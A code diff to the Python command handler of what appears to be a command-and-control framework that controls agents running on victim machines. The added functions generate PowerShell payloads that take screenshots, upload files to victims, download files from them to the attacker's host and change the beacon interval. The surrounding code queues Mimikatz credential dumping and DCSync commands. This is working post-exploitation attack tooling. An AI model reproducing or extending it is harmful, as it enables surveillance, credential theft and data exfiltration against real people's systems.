@@ -2,6 +2,7 @@
 import base64
 import hashlib,binascii
 from core import config
+from core.config import *
 from core.Encryption import *
 from core import webserver
 from lib import prettytable
@@ -9,6 +10,7 @@ from core.color import bcolors
 from core.color import *
 import time
 import os
+
 
 class cmd:
     COMMANDS = ['exit',
@@ -25,11 +27,15 @@ class cmd:
      'drm',
      'DA',
      'downloads',
+     'download',
+     'upload',
+     'set_beacon',
      'kerb',
      'dumpcreds',
      'dcsync_admins',
      'dcsync_list',
      'dcsync_all',
+     'screenshot',
      'kill_all',
      'delete_all',
      'get_groups',
@@ -48,7 +54,7 @@ class cmd:
      ['kill_all', 'kill all agents'],
      ['delete', 'delete agent from the list'],
      ['delete_all', 'delete all agents in the list'],
-     ['set-beacon', 'set the beacon interval live for agent'],
+     ['set_beacon', 'set the beacon interval live for agent'],
      ['download', 'download file from the vicitm'],
      ['downloads', 'list downloaded files'],
      ['upload', 'upload files to the victim'],
@@ -327,3 +333,68 @@ class cmd:
             return
         config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"load Invoke-Mimikatz.ps1"))
         config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"Invoke-Mimikatz -DumpCreds"))
+
+    def screenshot(self, args=None):
+        if config.get_pointer()=='main':
+            print "you can't use this command in main ! chose an agent"
+            return
+        f=open("agents/screenshot.ninja","r")
+        payload=f.read()
+        f.close()
+        if SSL==True:
+            payload=payload.replace('{ip}', HOST).replace('{port}', PORT).replace('{image}', image_url).replace('{cmd}', command_url).replace('{HTTP}', "https")
+        else:
+            payload=payload.replace('{ip}', HOST).replace('{port}', PORT).replace('{image}', image_url).replace('{cmd}', command_url).replace('{HTTP}', "http")
+        f=open("Modules/screenshot.ps1","w")
+        f.write(payload)
+        f.close()
+        config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"load screenshot.ps1"))
+        config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"scr  -test 0 "))
+
+
+
+    def upload(self, args=None):
+        if config.get_pointer()=='main':
+            print "you can't use this command in main ! chose an agent"
+            return
+        f=open("agents/upload.ninja","r")
+        payload=f.read()
+        f.close()
+        if SSL==True:
+            payload=payload.replace('{ip}', HOST).replace('{port}', PORT).replace('{upload}', upload_url).replace('{HTTP}', "https")
+        else:
+            payload=payload.replace('{ip}', HOST).replace('{port}', PORT).replace('{upload}', upload_url).replace('{HTTP}', "http")
+        f=open("Modules/upload.ps1","w")
+        f.write(payload)
+        f.close()
+        config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"load upload.ps1"))
+        config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"up -filename \""+args[1]+"\""))
+
+
+    def download(self, args=None):
+        if config.get_pointer()=='main':
+            print "you can't use this command in main ! chose an agent"
+            return
+        global loaded
+        f=open("agents/download.ninja","r")
+        payload=f.read()
+        f.close()
+        if SSL==True:
+            payload=payload.replace('{ip}', HOST).replace('{port}', PORT).replace('{download}', download_url).replace('{HTTP}', "https")
+        else:
+            payload=payload.replace('{ip}', HOST).replace('{port}', PORT).replace('{download}', download_url).replace('{HTTP}', "http")
+        f=open("Modules/download.ps1","w")
+        f.write(payload)
+        f.close()
+        #if loaded["download"]==False:
+        config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"load download.ps1"))
+        config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"dn -filename \""+args[1]+"\""))
+
+
+    def set_beacon(self, args=None):
+        if config.get_pointer()=='main':
+            print "you can't use this command in main ! chose an agent"
+            return
+        global loaded
+        config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"load download.ps1"))
+        config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"$beacon="+args[1]))
